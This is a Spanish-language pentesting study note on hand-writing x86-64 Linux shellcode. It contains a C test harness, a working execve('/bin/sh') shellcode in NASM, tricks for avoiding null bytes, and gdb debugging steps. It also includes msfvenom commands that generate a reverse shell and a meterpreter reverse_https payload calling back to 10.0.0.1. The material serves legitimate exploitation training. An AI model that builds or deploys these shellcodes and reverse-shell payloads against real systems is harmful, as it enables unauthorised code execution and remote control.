---
tags:
  - Corrupcion-Memoria
  - Payloads
  - Pentesting/Explotacion
Descripción: "Escribir shellcode a mano en x86-64: syscalls, restricciones de bytes, depuración con int3, y cuándo compensa frente a generarlo con msfvenom"
Fecha de actualización: 2026-08-03
Nota previa: "[[06 - Escritura arbitraria y subversión de lógica]]"
Nota siguiente: "[[08 - Mitigaciones modernas y cómo se saltan]]"
Area: "[[Fuzzing y explotación.base|Fuzzing y explotación]]"
---
---

<mark style="background: #ADCCFFA6;">*Shellcode* es código máquina autocontenido: sin cabecera de ejecutable, sin cargador, sin enlazado</mark>. Se copia a memoria ejecutable y se salta a él. En 2026 casi siempre lo genera una herramienta ([[Metasploit.base|Metasploit]], `04 - Shellcode Go-friendly con msfvenom`), pero saber escribirlo importa cuando hay **restricciones que ninguna herramienta va a respetar por ti**: bytes prohibidos, tamaño máximo, o una arquitectura que el generador no cubre.

## El arnés de pruebas

```c
// test_shellcode.c — mapea un fichero como ejecutable y salta a él
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

typedef int (*fn_t)(void);

int main(int argc, char **argv) {
    int fd = open(argv[1], O_RDONLY);
    struct stat st; fstat(fd, &st);
    fn_t sc = mmap(NULL, st.st_size, PROT_EXEC | PROT_READ, MAP_PRIVATE, fd, 0);
    printf("Mapeado en: %p\n", sc);
    printf("Resultado: %d\n", sc());
    return 0;
}
```

```shell-session
$ cc -Wall -o test_shellcode test_shellcode.c
$ nasm -f bin -o sc.bin sc.asm
$ ./test_shellcode sc.bin
```

`PROT_EXEC` es lo que hace que esto funcione pese a DEP: se lo estamos pidiendo explícitamente al kernel.

## Llamadas al sistema

La vía más portable dentro de un mismo SO: no dependes de dónde esté cargada la libc, así que el *shellcode* funciona sin conocer direcciones.

En **Linux x86-64**: número de llamada en `RAX`, argumentos en `RDI, RSI, RDX, R10, R8, R9`, e instrucción `syscall`.

| Nº | Llamada | Para qué |
| - | - | - |
| 1 | `write` | Salida de prueba |
| 2 | `open` | Abrir ficheros |
| 41 | `socket` | Crear socket |
| 42 | `connect` | Reverse shell |
| 59 | `execve` | **Ejecutar un programa** |
| 60 | `exit` | Salir limpiamente |

`execve("/bin/sh", NULL, NULL)`, la carga clásica:

```asm
BITS 64
    jmp     corto                 ; salto para obtener la dirección de la cadena
volver:
    pop     rdi                   ; RDI = puntero a "/bin/sh"
    xor     esi, esi              ; RSI = NULL (argv)   — xor evita bytes nulos
    xor     edx, edx              ; RDX = NULL (envp)
    push    59
    pop     rax                   ; RAX = 59 (execve)   — más corto que mov y sin nulos
    syscall
corto:
    call    volver                ; apila la dirección de la cadena siguiente
    db      "/bin/sh", 0
```

El truco `jmp`/`call`/`pop` resuelve el problema de no saber dónde está cargado el código: `call` apila la dirección de la instrucción siguiente, que es justo donde está la cadena.

## Depurar shellcode

`int3` genera `SIGTRAP` y para el depurador exactamente ahí:

```asm
BITS 64
    int3                          ; ← quitar en la versión final
    mov rax, 60
    xor edi, edi
    syscall
```

```shell-session
$ gdb --args ./test_shellcode sc.bin
(gdb) display/1i $rip
(gdb) r
Program received signal SIGTRAP, Trace/breakpoint trap.
1: x/i $rip  => 0x7f...: mov $0x3c,%eax
(gdb) stepi
```

Y para comprobar que se ensambló lo que creías:

```shell-session
$ ndisasm -b 64 sc.bin
00000000  EB0D              jmp short 0xf
00000002  5F                pop rdi
00000003  31F6              xor esi,esi
```

## Las restricciones que mandan

Aquí está el 90 % del trabajo real. <mark style="background: #FFB8EBA6;">**El desbordamiento impone qué bytes puedes usar**</mark> ([[04 - Explotación de desbordamiento de pila]]):

| Byte prohibido | Motivo | Cómo se evita |
| - | - | - |
| `\x00` | `strcpy` corta ahí | `xor eax,eax` en vez de `mov eax,0`; `push`/`pop` para constantes pequeñas |
| `\x0a` `\x0d` | Protocolo por líneas | Reescribir instrucciones o codificar |
| No alfanuméricos | Filtro que solo acepta `[A-Za-z0-9]` | *Shellcode* alfanumérico (existe, y es un arte aparte) |
| Solo ASCII imprimible | Filtro de texto | Codificador imprimible de Metasploit |

Idiomas para evitar nulos:

```asm
xor eax, eax        ; en vez de mov eax, 0        → 31 C0
push 59 ; pop rax   ; en vez de mov rax, 59       → 6A 3B 58
xor al, al          ; poner a cero solo el byte bajo
```

Y comprobar siempre el resultado:

```shell-session
$ xxd sc.bin | grep -c '00'          # ¿hay bytes nulos?
$ python3 -c "print(open('sc.bin','rb').read().hex())"
```

## Cuándo usar msfvenom en vez de escribirlo

Casi siempre. `msfvenom` genera cargas para decenas de plataformas, con codificadores y filtrado de bytes:

```shell-session
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
    -f raw -b '\x00\x0a\x0d' -o sc.bin

$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 \
    -f c -b '\x00'
```

`-b` es la opción que importa: le dices los bytes prohibidos y busca una codificación que los evite.

> [!warning]+ Los codificadores no evaden antivirus
> `-e x86/shikata_ga_nai` sirve para **eliminar bytes prohibidos**, no para evadir detección. Todos los codificadores de Metasploit llevan más de una década firmados por cualquier EDR; el *stub* de decodificación es la firma. Para evasión de verdad, [[Evasión de defensas.base|Evasión de defensas]] y [[00 - Arsenal de librerías Go ofensivas|desarrollo propio]].

Escribirlo a mano compensa cuando: el tamaño disponible es muy pequeño, las restricciones de bytes son exóticas, la arquitectura no está soportada (MIPS o ARM de un dispositivo empotrado con un ABI raro), o necesitas algo muy específico que no es una shell — leer un fichero, escribir una clave, cambiar un valor en memoria.

## Y muchas veces no hace falta shellcode

Con DEP activo no puedes ejecutar tu código sin más, así que el *payload* real suele ser una **cadena ROP** que llama a `mprotect` para hacer ejecutable una región, o directamente a `execve`/`system` ([[08 - Mitigaciones modernas y cómo se saltan]]).

Y para muchos objetivos, la alternativa más simple gana: en vez de una shell, **cambiar un booleano de privilegio** ([[06 - Escritura arbitraria y subversión de lógica]]) o llamar a una función que el propio programa ya ofrece. <mark style="background: #FF5582A6;">Menos código, más fiable y más limpio de demostrar</mark>.

> [!info]+ Fuentes
> - [Tabla de llamadas al sistema de Linux x86-64](https://filippo.io/linux-syscall-table/) y `man 2 syscall` para la convención de registros.
> - [NASM Documentation](https://www.nasm.us/docs.php).
> - [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) — opciones `-b`, `-f`, `-e`.
> - Forshaw, *Attacking Network Protocols*, cap. 10, «Writing Shell Code».
